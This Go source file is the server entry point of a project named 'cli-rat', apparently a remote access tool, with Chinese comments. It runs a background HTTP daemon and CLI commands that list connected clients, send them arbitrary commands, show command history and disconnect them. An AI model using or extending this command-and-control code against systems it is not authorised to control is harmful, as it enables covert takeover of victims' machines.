// Package main 是服务端的入口程序
// 负责启动HTTP服务器和处理命令行指令
package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"

	"cli-rat/pkg/process"
	"cli-rat/server/cli"
	"cli-rat/server/handlers"
)

var (
	// initFlag 启动服务端标志（-init 参数）
	initFlag bool
	// serverFlag 服务端内部运行模式标志（-server 参数）
	serverFlag bool
	// listenIP 监听IP地址（-ip 参数）
	listenIP string
	// listenPort 监听端口（-port 参数）
	listenPort int
)

func init() {
	// 初始化命令行参数
	flag.BoolVar(&initFlag, "init", false, "启动服务端（后台运行）")
	flag.BoolVar(&serverFlag, "server", false, "服务端内部运行模式")
	flag.StringVar(&listenIP, "ip", "0.0.0.0", "监听IP地址")
	flag.IntVar(&listenPort, "port", 8080, "监听端口")
}

// main 程序入口
func main() {
	// 解析命令行参数
	flag.Parse()

	// 创建HTTP服务器实例
	server := handlers.New(listenIP, listenPort)
	// 创建命令行接口实例
	cmdCli := cli.New(server)

	// ===== 后台启动模式 =====
	// 当用户执行 server.exe -init 时
	if initFlag {
		// 检查是否已被锁定（防止重复启动）
		if !process.AcquireLock() {
			fmt.Println("错误: 服务端已在运行")
			cmdCli.Status()
			return
		}

		// 分离为后台守护进程
		proc, err := process.DetachProcess(listenIP, listenPort)
		if err != nil {
			fmt.Printf("启动失败: %v\n", err)
			process.ReleaseLock()
			return
		}

		// 保存进程ID
		process.SavePID(proc.Pid)
		fmt.Println("=== 服务端已启动 ===")
		fmt.Printf("进程 PID: %d\n", proc.Pid)
		fmt.Printf("监听地址: %s\n", server.ListenAddr())
		return
	}

	// ===== 守护进程模式 =====
	// 当进程以守护进程方式运行时（环境变量 SERVER_MODE=daemon）
	if os.Getenv("SERVER_MODE") == "daemon" {
		runDaemon(server)
		return
	}

	// ===== 命令行模式 =====
	// 处理各种命令行指令
	if flag.NArg() == 0 {
		// 无参数，显示帮助
		cmdCli.Help()
		return
	}

	// 执行命令
	executeCommand(cmdCli)
}

// runDaemon 守护进程运行模式
// server: HTTP服务器实例
// 启动HTTP服务并处理请求
func runDaemon(server *handlers.Server) {
	// 打开日志文件（追加模式）
	logF, err := os.OpenFile(process.LogFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err == nil {
		defer logF.Close()
		fmt.Fprintln(logF, "[服务端启动]")
	}

	// 注册所有HTTP路由
	server.RegisterRoutes()

	// 记录启动日志
	if logF != nil {
		fmt.Fprintf(logF, "[HTTP服务] 启动成功 http://%s\n", server.ListenAddr())
	}
	fmt.Printf("[HTTP服务] 启动成功 http://%s\n", server.ListenAddr())

	// 启动HTTP服务（阻塞）
	if err := http.ListenAndServe(server.ListenAddr(), nil); err != nil {
		if logF != nil {
			fmt.Fprintf(logF, "HTTP服务启动失败: %v\n", err)
		}
	}
}

// executeCommand 执行命令行命令
// cmdCli: 命令行接口实例
// 根据第一个参数判断执行哪个命令
func executeCommand(cmdCli *cli.CLI) {
	cmd := flag.Arg(0)
	args := flag.Args()[1:]

	switch cmd {
	case "list":
		// 查看在线客户端
		cmdCli.ListClients()

	case "send":
		// 发送命令给客户端
		// 用法: server.exe send <client_id> <command>
		if len(args) < 2 {
			fmt.Println("用法: server.exe send <client_id> <command>")
			return
		}
		if err := cmdCli.SendCommand(args[0], strings.Join(args[1:], " ")); err != nil {
			fmt.Printf("发送失败: %v\n", err)
		}

	case "history":
		// 查看命令历史
		cmdCli.History()

	case "show":
		// 查看命令详情
		// 用法: server.exe show <command_id>
		if len(args) < 1 {
			fmt.Println("用法: server.exe show <command_id>")
			return
		}
		cmdCli.ShowCommand(args[0])

	case "kill":
		// 断开客户端连接
		// 用法: server.exe kill <client_id>
		if len(args) < 1 {
			fmt.Println("用法: server.exe kill <client_id>")
			return
		}
		if err := cmdCli.KillClient(args[0]); err != nil {
			fmt.Printf("断开失败: %v\n", err)
		}

	case "stop":
		// 停止服务端
		if err := cmdCli.Stop(); err != nil {
			fmt.Printf("停止失败: %v\n", err)
		}

	case "status":
		// 检查服务端状态
		cmdCli.Status()

	case "help", "-h", "--help":
		// 显示帮助
		cmdCli.Help()

	default:
		// 未知命令
		fmt.Printf("未知命令: %s\n", cmd)
		fmt.Println("输入 server.exe help 查看可用命令")
	}
}
